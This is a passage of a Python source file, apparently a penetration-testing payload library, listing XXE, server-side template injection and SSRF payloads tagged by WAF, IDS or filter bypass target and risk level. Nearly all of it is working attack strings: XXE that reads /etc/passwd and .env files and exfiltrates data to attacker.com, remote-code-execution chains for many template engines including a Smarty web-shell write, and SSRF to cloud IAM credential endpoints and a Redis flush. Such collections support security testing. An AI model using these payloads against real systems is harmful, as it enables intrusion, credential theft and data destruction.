            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_via_rss': {
            'payload': '<?xml version="1.0"?><!DOCTYPE rss SYSTEM "http://attacker.com/evil.dtd"><rss version="2.0"><channel><item><title>test</title></item></channel></rss>',
            'description': 'XXE in RSS SYSTEM identifier',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_wildcard_systemid': {
            'payload': '<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE using DOCTYPE ANY keyword',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_via_atom_feed': {
            'payload': '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE feed [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><feed xmlns="http://www.w3.org/2005/Atom"><title>&xxe;</title></feed>',
            'description': 'XXE in Atom feed title element',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_entity_in_comment': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><!-- &xxe; --><foo>&xxe;</foo>',
            'description': 'XXE entity reference after XML comment',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_pi_injection': {
            'payload': '<?xml version="1.0"?><?xml-stylesheet type="text/xml" href="http://attacker.com/evil.xsl"?><foo/>',
            'description': 'XXE via XML processing instruction stylesheet',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_server_side_include': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/fd/200">]><foo>&xxe;</foo>',
            'description': 'XXE via /proc/self/fd for file descriptor leakage',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xxe_env_file': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///.env">]><foo>&xxe;</foo>',
            'description': 'XXE targeting .env environment file',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_internal_entity_ref': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "test"><!ENTITY xxe "&a; injected">]><foo>&xxe;</foo>',
            'description': 'XXE via internal entity reference chaining',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'xxe_microsoft_word': {
            'payload': '<?xml version="1.0"?><!DOCTYPE document [<!ENTITY xxe SYSTEM "file:///c:/users/user/documents/confidential.docx">]><document><body>&xxe;</body></document>',
            'description': 'XXE targeting Word document path',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xxe_soap_wsdl': {
            'payload': '<?xml version="1.0"?><!DOCTYPE message [<!ENTITY xxe SYSTEM "file:///app/config/services.xml">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>',
            'description': 'XXE in SOAP envelope body',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_via_xhtml': {
            'payload': '<?xml version="1.0"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://attacker.com/evil.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Test</title></head><body>xxe</body></html>',
            'description': 'XXE via XHTML PUBLIC identifier',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_oob_via_parameter': {
            'payload': '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/%file;"> %xxe;]><test/>',
            'description': 'OOB XXE data exfil via parameter entity in URL',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        }
    }
    
    # SSTI Bypass Payloads
    SSTI_PAYLOADS = {
        'ssti_jinja2': {
            'payload': '{{7*7}}',
            'description': 'Basic Jinja2 SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_jinja2_rce': {
            'payload': "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            'description': 'Jinja2 RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_erb': {
            'payload': '<%= 7*7 %>',
            'description': 'Basic ERB SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_freemarker': {
            'payload': '${7*7}',
            'description': 'FreeMarker SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_velocity': {
            'payload': '#set($x=7*7)$x',
            'description': 'Velocity SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_smarty': {
            'payload': '{$smarty.version}',
            'description': 'Smarty version disclosure',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ssti_twig': {
            'payload': '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}',
            'description': 'Twig RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_mako': {
            'payload': '${7*7}',
            'description': 'Mako SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_underscore': {
            'payload': '<%= global.process.mainModule.require("child_process").execSync("whoami") %>',
            'description': 'Underscore.js template RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_pug': {
            'payload': '#{7*7}',
            'description': 'Pug/Jade SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Jinja2/Flask additional payloads
        'ssti_jinja2_config': {
            'payload': "{{config.items()}}",
            'description': 'Jinja2 config dump',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_jinja2_subclasses': {
            'payload': "{{''.__class__.__mro__[1].__subclasses__()}}",
            'description': 'Jinja2 list all Python subclasses',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_os_system': {
            'payload': "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            'description': 'Jinja2 RCE via subprocess',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_cycler': {
            'payload': "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            'description': 'Jinja2 RCE via cycler global',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_joiner': {
            'payload': "{{joiner.__init__.__globals__.os.popen('id').read()}}",
            'description': 'Jinja2 RCE via joiner global',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_namespace': {
            'payload': "{{namespace.__init__.__globals__.os.popen('id').read()}}",
            'description': 'Jinja2 RCE via namespace global',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_filter_bypass': {
            'payload': "{{'id'|e}}{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
            'description': 'Jinja2 filter bypass with RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_request': {
            'payload': "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            'description': 'Jinja2 RCE via request context',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Twig (PHP)
        'ssti_twig_basic': {
            'payload': '{{7*7}}',
            'description': 'Twig template injection test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_twig_rce': {
            'payload': "{{['id']|filter('system')}}",
            'description': 'Twig RCE via filter function',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_twig_object_dump': {
            'payload': '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            'description': 'Twig SSTI via registerUndefinedFilterCallback',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_twig_v1': {
            'payload': '{{_self.env.enableDebug()}}{{_self.env.isDebug()}}',
            'description': 'Twig v1 enable debug mode',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Freemarker (Java)
        'ssti_freemarker_basic': {
            'payload': '${7*7}',
            'description': 'FreeMarker basic test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_freemarker_rce': {
            'payload': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            'description': 'FreeMarker RCE via Execute class',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_freemarker_class': {
            'payload': '${class.getResource("").toURI().resolve("file:///etc/passwd").toURL().text}',
            'description': 'FreeMarker file read via class resource',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Velocity (Java)
        'ssti_velocity_basic': {
            'payload': '#set($x = 7*7)${x}',
            'description': 'Apache Velocity basic test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_velocity_rce': {
            'payload': '#set($runtime=$class.forName("java.lang.Runtime").getMethod("exec","".class).invoke($class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))${runtime}',
            'description': 'Velocity RCE via Java Runtime',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Smarty (PHP)
        'ssti_smarty_basic': {
            'payload': '{$smarty.version}',
            'description': 'Smarty version information',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ssti_smarty_rce': {
            'payload': '{php}echo `id`;{/php}',
            'description': 'Smarty PHP execution',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_smarty_rce_v3': {
            'payload': '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[\'cmd\']); ?>",self::clearConfig())}',
            'description': 'Smarty v3 writeFile RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Mako (Python)
        'ssti_mako_basic': {
            'payload': '${7*7}',
            'description': 'Mako template basic test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_mako_rce': {
            'payload': "${__import__('os').popen('id').read()}",
            'description': 'Mako RCE via __import__',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Tornado (Python)
        'ssti_tornado_basic': {
            'payload': '{% import os %}{{os.popen("id").read()}}',
            'description': 'Tornado template import and RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Handlebars (Node.js)
        'ssti_handlebars_basic': {
            'payload': '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
            'description': 'Handlebars sandbox escape RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Nunjucks (Node.js)
        'ssti_nunjucks_basic': {
            'payload': '{{7*7}}',
            'description': 'Nunjucks basic test (same as Jinja2)',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_nunjucks_rce': {
            'payload': '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\').toString()")()}}',
            'description': 'Nunjucks RCE via constructor',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Sandbox escape techniques
        'ssti_sandbox_mro': {
            'payload': "{{().__class__.__bases__[0].__subclasses__()}}",
            'description': 'Python sandbox escape via MRO',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_sandbox_builtins': {
            'payload': "{{self.__init__.__globals__.__builtins__}}",
            'description': 'Access builtins via self globals',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Detection payloads
        'ssti_detect_multiply': {
            'payload': '{{7*"7"}}',
            'description': 'SSTI engine detection via type coercion',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ssti_detect_dollar': {
            'payload': '${7*7}',
            'description': 'Dollar brace SSTI detection (Java/Mako)',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ssti_detect_erb': {
            'payload': '<%= 7*7 %>',
            'description': 'ERB style SSTI detection (Ruby)',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ssti_detect_hash': {
            'payload': '#{7*7}',
            'description': 'Hash brace SSTI detection (Ruby/Pug)',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ssti_detect_velocity': {
            'payload': '#set($test=7*7)${test}',
            'description': 'Velocity engine detection',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        # ERB (Ruby on Rails)
        'ssti_erb_system': {
            'payload': '<%= `id` %>',
            'description': 'ERB backtick command execution',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_erb_popen': {
            'payload': '<%= IO.popen("id").read %>',
            'description': 'ERB IO.popen RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_erb_open': {
            'payload': "<%= open('/etc/passwd').read %>",
            'description': 'ERB file read via open()',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Thymeleaf (Java Spring)
        'ssti_thymeleaf_basic': {
            'payload': '__${7*7}__::.x',
            'description': 'Thymeleaf preprocessing SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_thymeleaf_rce': {
            'payload': '__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x',
            'description': 'Thymeleaf SSTI RCE via T() operator',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_thymeleaf_spel': {
            'payload': "${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{'id'}).getInputStream(),T(java.nio.charset.Charset).defaultCharset())}",
            'description': 'Thymeleaf/SpEL RCE with exec output',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Spring SpEL injection
        'ssti_spel_basic': {
            'payload': '#{7*7}',
            'description': 'Spring SpEL basic test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_spel_rce': {
            'payload': "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            'description': 'Spring SpEL direct RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Groovy (Grails/Jenkins)
        'ssti_groovy_basic': {
            'payload': '${7*7}',
            'description': 'Groovy GString basic test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_groovy_exec': {
            'payload': '${"id".execute().text}',
            'description': 'Groovy GString command execution',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Craft CMS (Twig-based)
        'ssti_craft_object': {
            'payload': '{{ craft.app.config.getConfigFromFile("db") }}',
            'description': 'Craft CMS config file read via Twig',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # ASP.NET Razor
        'ssti_razor_basic': {
            'payload': '@(7*7)',
            'description': 'Razor template basic test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_razor_rce': {
            'payload': '@System.Diagnostics.Process.Start("cmd.exe","/c id > /tmp/out")',
            'description': 'Razor template RCE via Process.Start',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Golang templates
        'ssti_golang_basic': {
            'payload': '{{.}}',
            'description': 'Golang template basic object dump',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ssti_golang_func': {
            'payload': '{{html "test"}}',
            'description': 'Golang template function call',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'low'
        },
        # Sandbox escapes
        'ssti_jinja2_attr_bypass': {
            'payload': "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            'description': 'Jinja2 RCE using attr filter to bypass string detection',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_no_underscores': {
            'payload': "{{request.application.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
            'description': 'Jinja2 RCE via globals builtins import',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_lipsum': {
            'payload': "{{lipsum.__globals__.os.popen('id').read()}}",
            'description': 'Jinja2 RCE via lipsum global',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_range': {
            'payload': "{{range.__class__.__base__.__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}",
            'description': 'Jinja2 RCE via range builtins',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_mako_module': {
            'payload': '${self.module.cache.util.os.system("id")}',
            'description': 'Mako RCE via self.module chain',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_freemarker_api': {
            'payload': "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            'description': 'FreeMarker RCE alternative syntax',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_waf_bypass_format': {
            'payload': "{{'id'|format|lower}}{{cycler.__init__.__globals__.os.popen('id').read()}}",
            'description': 'Jinja2 format filter before RCE for WAF bypass',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_twig_version2': {
            'payload': "{{['id']|map('system')|join}}",
            'description': 'Twig v2+ RCE via map with system',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_mustache_basic': {
            'payload': '{{username}}',
            'description': 'Mustache variable injection test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'info'
        },
        'ssti_jinja2_config_secret': {
            'payload': "{{config.SECRET_KEY}}",
            'description': 'Jinja2 Flask secret key extraction',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_url_for': {
            'payload': "{{url_for.__globals__['__builtins__']['__import__']('os').system('id')}}",
            'description': 'Jinja2 RCE via url_for globals',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_get_flashed': {
            'payload': "{{get_flashed_messages.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"id\")')}}",
            'description': 'Jinja2 RCE via get_flashed_messages globals',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_freemarker_static': {
            'payload': '${statics["java.lang.Runtime"].getRuntime().exec("id").text}',
            'description': 'FreeMarker RCE via statics access',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_velocity_tools': {
            'payload': '#foreach($class in $classLoader.loadedPackages)$class.toString()#end',
            'description': 'Velocity iterate loaded packages',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_twig_block': {
            'payload': '{% if 7*7==49 %}yes{% endif %}',
            'description': 'Twig if block condition test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ssti_jinja2_decode': {
            'payload': "{{().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
            'description': 'Jinja2 RCE via eval from builtins index',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_angular_sandbox_1_1_5': {
            'payload': '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval(\'a,alert(1),a\')}}',
            'description': 'AngularJS 1.1.5 sandbox escape',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_angular_sandbox_1_3_x': {
            'payload': '{{\'a\'.constructor.prototype.charAt=\'a\'.concat;$eval(\'x=1} } };alert(1)//\')}}',
            'description': 'AngularJS 1.3.x sandbox escape',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_jinja2_tojson_bypass': {
            'payload': '{{request|tojson|forceescape}}',
            'description': 'Jinja2 request object dump via tojson',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ssti_twig_sandbox_env': {
            'payload': '{{_self.env.setCache("ftp://attacker.com:21/test.php")}}',
            'description': 'Twig cache file write for RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_pebble_java_reflection': {
            'payload': '{{ someString.toUPPERCASE() }}',
            'description': 'Pebble template Java method call test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        }
    }
    
    # SSRF Bypass Payloads
    SSRF_PAYLOADS = {
        'ssrf_localhost': {
            'payload': 'http://localhost/admin',
            'description': 'Basic localhost SSRF',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_127001': {
            'payload': 'http://127.0.0.1/admin',
            'description': '127.0.0.1 SSRF',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_hex_encoding': {
            'payload': 'http://0x7f.0x00.0x00.0x01/admin',
            'description': 'Hex encoded IP',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_octal': {
            'payload': 'http://0177.0.0.01/admin',
            'description': 'Octal encoded IP',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_decimal': {
            'payload': 'http://2130706433/admin',
            'description': 'Decimal IP (127.0.0.1)',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_short_ip': {
            'payload': 'http://127.1/admin',
            'description': 'Shortened IP notation',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_cloud_metadata': {
            'payload': 'http://169.254.169.254/latest/meta-data/',
            'description': 'Cloud metadata endpoint',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_redirect': {
            'payload': 'http://attacker.com/redirect-to-internal',
            'description': 'SSRF via redirect',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_dns_rebinding': {
            'payload': 'http://rebind.attacker.com/admin',
            'description': 'DNS rebinding',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_url_bypass': {
            'payload': 'http://evil.com@127.0.0.1/admin',
            'description': 'URL parser bypass',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        # IPv6 SSRF bypasses
        'ssrf_ipv6_localhost': {
            'payload': 'http://[::1]/admin',
            'description': 'IPv6 localhost SSRF',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_ipv6_mapped': {
            'payload': 'http://[::ffff:127.0.0.1]/admin',
            'description': 'IPv6 mapped IPv4 localhost',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_ipv6_full': {
            'payload': 'http://[0000:0000:0000:0000:0000:0000:0000:0001]/admin',
            'description': 'Full IPv6 loopback address',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        # Cloud provider metadata
        'ssrf_aws_metadata': {
            'payload': 'http://169.254.169.254/latest/meta-data/',
            'description': 'AWS EC2 instance metadata service',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_aws_credentials': {
            'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'description': 'AWS IAM security credentials',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_aws_userdata': {
            'payload': 'http://169.254.169.254/latest/user-data',
            'description': 'AWS EC2 user data',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_aws_imdsv2': {
            'payload': 'http://169.254.169.254/latest/api/token',
            'description': 'AWS IMDSv2 token endpoint',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_gcp_metadata': {
            'payload': 'http://metadata.google.internal/computeMetadata/v1/',
            'description': 'GCP instance metadata service',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_gcp_service_accounts': {
            'payload': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
            'description': 'GCP service account metadata',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_azure_metadata': {
            'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'description': 'Azure IMDS endpoint',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_digitalocean_metadata': {
            'payload': 'http://169.254.169.254/metadata/v1/',
            'description': 'DigitalOcean metadata service',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        # Gopher protocol
        'ssrf_gopher_redis': {
            'payload': 'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A',
            'description': 'Gopher protocol to attack Redis',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
